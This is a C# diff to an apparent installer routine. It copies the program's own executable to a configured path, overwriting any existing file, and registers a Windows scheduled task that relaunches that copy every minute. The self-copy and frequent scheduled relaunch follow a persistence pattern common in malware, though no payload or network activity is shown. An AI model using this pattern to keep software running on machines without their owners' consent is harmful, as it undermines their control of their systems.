@@ -9,22 +9,19 @@ public class Installation
     {
         try
         {
-            string exePath = Path.Combine(Config.file_path, "stms.exe");
+            if (File.Exists(Config.file_path))
+                File.Delete(Config.file_path);
 
-            if (!Directory.Exists(Config.file_path))
-                Directory.CreateDirectory(Config.file_path);
-
-            File.Copy(Environment.ProcessPath, exePath);
+            File.Copy(Environment.ProcessPath, Config.file_path, true);
 
             if (string.IsNullOrWhiteSpace(Config.task_name))
                 throw new ArgumentException("Empty task name!");
 
-            string arguments;
-            if (string.IsNullOrWhiteSpace(exePath))
+            if (string.IsNullOrWhiteSpace(Config.file_path))
                 throw new ArgumentException("Empty exePath!");
 
-            string actionCommand = $"\\\"{exePath}\\\" --start";
-            arguments = $"/Create /TN \"{Config.task_name}\" /TR \"{actionCommand}\" /SC MINUTE /MO 1 /RL LIMITED /F";
+            string actionCommand = $"\\\"{Config.file_path}\\\" --start";
+            string arguments = $"/Create /TN \"{Config.task_name}\" /TR \"{actionCommand}\" /SC MINUTE /MO 1 /RL LIMITED /F";
 
             using var process = new Process
             {
